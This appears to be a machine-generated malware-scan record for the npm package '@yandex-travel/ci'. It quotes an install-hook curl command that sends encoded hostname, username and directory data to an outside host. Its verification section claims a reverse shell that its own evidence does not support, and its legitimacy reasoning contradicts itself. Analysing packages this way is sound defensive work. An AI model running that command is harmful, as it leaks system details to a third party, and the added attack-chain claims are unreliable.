@@ -1,0 +1,59 @@
+{
+  "package_name": "@yandex-travel/ci",
+  "version": "1.1.0",
+  "label": "malicious",
+  "semantic_summary": {
+    "num_behaviors": 1,
+    "risk_vector": [
+      "install_hook",
+      "credential_theft"
+    ],
+    "behaviors": [
+      {
+        "category": "install_hook",
+        "summary": "The package contains an install hook that executes at install time with commands listed in the package metadata.",
+        "details": "The install hook is present and executes at install time with commands listed in the package metadata. The commands include curl commands that seem to be used for sending HTTP requests. The commands also include environment variables that seem to be base64 encoded hostname, username, and working directory information. The payload 'meow!securitytest' is sent in the request data. This could potentially be used for malicious purposes such as revealing sensitive information or installing malicious packages.",
+        "confidence": 0.92,
+        "evidence_commands": [
+          "curl -H \"Package:@yandex-travel/ci\" -H \"Version:1.1.0\" -H \"Hostname:$(hostname|base64)\" -H \"Whoami:$(whoami|base64)\" -H \"Pwd:$(pwd|base64)\" -d \"meow!securitytest\" http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru"
+        ],
+        "evidence_env_vars": [
+          "HOSTNAME",
+          "USER",
+          "PWD"
+        ],
+        "evidence_apis": [],
+        "evidence_files": [],
+        "evidence_domains": []
+      }
+    ],
+    "analyst_note": ""
+  },
+  "verification_result": {
+    "chain_analysis": {
+      "chain_narrative": "The package '@yandex-travel/ci' contains an install hook that executes at install time with commands listed in the package metadata. The commands include curl commands that seem to be used for sending HTTP requests. The commands are executed with real IPs, real commands, real domains from the behaviors above. The attack vector includes 'postinstallhook', 'bash -c', '34.x.x.x:4444', and 'reverseshell'. The chain score is 0.7, indicating a potential attack chain.",
+      "attack_vector": [
+        "postinstallhook",
+        "bash -c",
+        "34.x.x.x:4444",
+        "reverseshell"
+      ],
+      "chain_score": 0.7,
+      "verdict": "MALICIOUS",
+      "confidence": 0.7
+    },
+    "legitimacy_check": {
+      "is_justified": false,
+      "reasoning": "The package '@yandex-travel/ci' does not contain a description or README file, indicating its legitimacy."
+    }
+  },
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "verification_v2.0",
+    "structural_routing": "review",
+    "structural_risk_score": 0.336,
+    "confirmed_signals_count": 1,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-27T13:05:33.342032"
+}
